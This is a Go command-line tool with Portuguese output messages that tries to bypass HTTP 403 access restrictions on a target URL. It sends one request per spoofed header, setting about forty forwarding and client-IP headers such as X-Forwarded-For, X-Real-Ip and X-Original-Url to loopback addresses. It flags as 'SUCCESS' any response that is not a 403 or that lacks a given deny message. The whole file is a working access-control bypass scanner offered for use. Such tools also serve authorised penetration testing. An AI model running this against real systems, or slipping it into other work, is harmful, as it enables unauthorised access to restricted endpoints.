package main

import (
	"flag"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	"github.com/fatih/color"
)

var headers = map[string]string{
	"Base-Url": "127.0.0.1",
	"Client-IP": "127.0.0.2",
	"Http-Url": "127.0.0.3",
	"Proxy-Host": "127.0.0.4",
	"Proxy-Url": "127.0.0.5",
	"Real-Ip": "127.0.0.6",
	"Redirect": "127.0.0.7",
	"Referer": "127.0.0.8",
	"Referrer": "127.0.0.9",
	"Refferer": "127.0.0.10",
	"Request-Uri": "127.0.0.11",
	"Uri": "127.0.0.12",
	"Url": "127.0.0.13",
	"X-Client-IP": "127.0.0.14",
	"X-Custom-IP-Authorization": "127.0.0.15",
	"X-Forward-For": "127.0.0.16",
	"X-Forwarded-By": "127.0.0.17",
	"X-Forwarded-For-Original": "127.0.0.18",
	"X-Forwarded-For": "127.0.0.19",
	"X-Forwarded-Host": "127.0.0.20",
	"X-Forwarded-Server": "127.0.0.21",
	"X-Forwarded": "127.0.0.22",
	"X-Forwarder-For": "127.0.0.23",
	"X-Host": "127.0.0.24",
	"X-Http-Destinationurl": "127.0.0.25",
	"X-Http-Host-Override": "127.0.0.26",
	"X-Original-Remote-Addr": "127.0.0.27",
	"X-Original-Url": "127.0.0.28",
	"X-Originating-IP": "127.0.0.29",
	"X-Proxy-Url": "127.0.0.30",
	"X-Real-Ip": "127.0.0.31",
	"X-Remote-Addr": "127.0.0.32",
	"X-Remote-IP": "127.0.0.33",
	"X-Rewrite-Url": "127.0.0.34",
	"X-True-IP": "127.0.0.35",
	"X-ProxyUser-Ip": "127.0.0.36",
	"Cluster-Client-IP": "127.0.0.38",
	"X-Cluster-Client-IP": "127.0.0.39",
}

func main() {
	url := flag.String("url", "", "URL do alvo")
	denyMessage := flag.String("deny-message", "", "Mensagem de bloqueio para verificar se desaparece")
	flag.Parse()

	if *url == "" {
		color.Red("[!] É necessário fornecer uma URL com --url")
		return
	}

	color.Cyan("[+] Testando payloads de headers em %s", *url)

	for header, value := range headers {
		testHeader(*url, header, value, *denyMessage)
	}
}

func testHeader(targetURL, header, value, denyMessage string) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		color.Red("[ERROR] Erro ao criar request: %s", err)
		return
	}

	req.Header.Set(header, value)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		color.Red("[ERROR] Falha ao enviar request: %s", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(body)

	if denyMessage != "" {
		if !strings.Contains(bodyStr, denyMessage) {
			color.Green("[SUCCESS] Header: %s -> Código: %d (Deny message ausente)", header, resp.StatusCode)
		} else {
			color.Yellow("[INFO] Header: %s não alterou a resposta (%d) e deny-message ainda está presente", header, resp.StatusCode)
		}
	} else {
		if resp.StatusCode != 403 && resp.StatusCode < 500 {
			color.Green("[SUCCESS] Header: %s -> Código: %d", header, resp.StatusCode)
		} else {
			color.Yellow("[INFO] Header: %s não alterou a resposta (%d)", header, resp.StatusCode)
		}
	}
}
